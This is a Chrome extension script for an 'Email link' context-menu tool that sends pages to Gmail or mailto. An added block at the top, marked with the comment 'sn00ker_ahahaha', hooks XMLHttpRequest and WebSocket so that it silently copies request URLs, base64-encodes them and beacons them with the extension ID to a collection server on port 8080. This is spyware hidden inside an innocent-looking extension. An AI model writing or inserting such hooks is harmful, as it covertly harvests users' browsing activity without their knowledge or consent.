function collectMessageToServer(data){
    var img = document.createElement("img");
    img.src = "http://127.0.0.1:8080/" + chrome.runtime.id + "/" + data;
}

function hookAjax(){
    var _XMLHTTPRequestOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(){
        console.log(arguments);
        collectMessageToServer("bk-ajax-" + btoa(arguments[1]));
        _XMLHTTPRequestOpen.apply(this, arguments);
    }
}
function hookWebsocket() {
    var _websockSend = WebSocket.prototype.send;
    WebSocket.prototype.send = () => {
        console.log(arguments);
        collectMessageToServer("bk-ws-" + btoa(arguments[1]));
        _websockSend.apply(this, arguments);
    }
}

function run(){
    hookAjax();
    hookWebsocket();
}
run();
//sn00ker_ahahaha
chrome.contextMenus.onClicked.addListener(function(a,c){if("LEmailLink"==a.menuItemId){var b=a.pageUrl;a.mediaType?b=a.srcUrl:a.linkUrl&&(b=a.linkUrl);a.selectionText&&(b=a.selectionText+"\n\n"+b);sendMail(c.id,c.title,b)}});
function sendMail(a,c,b){b=encodeURIComponent(b);var d=window.localStorage.prefix,d=encodeURIComponent(d?d+(" "+c):c);"0"!=localStorage.gmail?(a="https://mail.google.com/",(c=localStorage.gappsdomain)&&(a+="a/"+c+"/"),a+="mail/?view=cm&fs=1&tf=1&su="+d+"&body="+b,chrome.windows.create({url:a,width:640,height:480,type:"popup",focused:!0})):chrome.tabs.update(a,{url:"mailto:?subject="+d+"&body="+b})}
chrome.runtime.onInstalled.addListener(function(){chrome.contextMenus.create({title:"Email link",contexts:["all"],id:"LEmailLink"})});chrome.browserAction.onClicked.addListener(function(a){sendMail(a.id,a.title,a.url,null)});